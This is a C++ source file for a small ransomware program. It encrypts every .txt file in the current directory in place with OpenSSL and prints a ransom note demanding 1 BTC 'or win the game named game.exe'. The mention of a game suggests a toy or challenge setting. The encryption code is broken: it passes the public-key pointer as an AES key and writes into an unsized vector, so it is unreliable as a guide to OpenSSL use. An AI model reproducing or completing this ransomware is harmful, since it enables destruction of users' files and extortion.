#include <iostream>
#include <Windows.h>
#include <filesystem>
#include <string>
#include <fstream>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/pem.h>

const std::string key = "-----BEGIN PUBLIC KEY-----\n"
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwnxsHPeHg0/hbfMiCvlZ\n"
        "+gr+IEzgGU/dL9QQattUCpNaIg2S+bY1pSUp/W6k4ndRj4rDBOc4TCXhQpdfd6rl\n"
        "vPYvriZl2vEJqP56Vu47QmWjFBYwL5UyZZb6jm+jBp/Lj3imbqCoQsfSFgML1Vjp\n"
        "ucYwOKabMbIMUv6fBR7hknGjm2V+/VYswrNvYD+/PWmZ3m8XkMsaL2mfr2G+OU4o\n"
        "3DseaB5rWDDC9zicVlmYBFF7FutYU3easA0E30BOdd5VkTIjuJJXjhnH+X0kXXVT\n"
        "m2akic53+xiQ7rUZzuZXzyz83nH0Jxl7CmlwiQmWe0o2+zCVmvYM1zdLS6lsCwFp\n"
        "8QIDAQAB\n"
    "-----END PUBLIC KEY-----\n";

void encryptFile(const std::filesystem::path filename)
{
    // Load the public key from a file
    //std::ifstream keyFile("publickey.pem");
    //std::string key((std::istreambuf_iterator<char>(keyFile)), std::istreambuf_iterator<char>());

    // Create an EVP_PKEY structure and load the public key into it
    EVP_PKEY* pkey = EVP_PKEY_new();
    BIO* keyBio = BIO_new_mem_buf(key.c_str(), key.size());
    PEM_read_bio_PUBKEY(keyBio, &pkey, nullptr, nullptr);
    BIO_free(keyBio);

    // Read the data to be encrypted from a file
    std::ifstream dataFile(filename);
    std::string data((std::istreambuf_iterator<char>(dataFile)), std::istreambuf_iterator<char>());

    // Create an EVP_CIPHER_CTX structure and initialize it for encryption
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_set_padding(ctx, 1);
    EVP_EncryptInit_ex(ctx, nullptr, nullptr, nullptr, nullptr);
    EVP_EncryptInit_ex(ctx, nullptr, nullptr, (const unsigned char*)pkey, nullptr);

    // Encrypt the data
    int outlen1, outlen2;
    std::vector<unsigned char> outbuf;
    outbuf.reserve(8192);
    EVP_EncryptUpdate(ctx, outbuf.data(), &outlen1, (const unsigned char*)data.c_str(), data.size());

    // Finalize the encryption process
    EVP_EncryptFinal_ex(ctx, outbuf.data() + outlen1, &outlen2);

    // Write the encrypted data to a file
    std::ofstream outFile(filename, std::ios::binary);
    outFile.write((char*)outbuf.data(), outlen1 + outlen2);

    // Clean up
    EVP_CIPHER_CTX_free(ctx);
    EVP_PKEY_free(pkey);
    outbuf.clear();
}

int main()
{
    std::string path = ".";
    std::filesystem::path extension = "";
    
    for (const auto& entry : std::filesystem::directory_iterator(path))
    {
        extension = std::filesystem::path(entry.path()).extension();

        if (extension == ".txt")
        {
            encryptFile(entry.path());
        }
    }
    
    std::cout << "Oh no! Your .txt files in the current directory have been encrypted!\n";
    std::cout << "If you want to recover your files you should pay me 1 BTC (or win the game named game.exe)\n\n";
    std::cout << "Press F1 to exit this window.";

    while (1)
        if (GetAsyncKeyState(VK_F1))
            exit(1);
}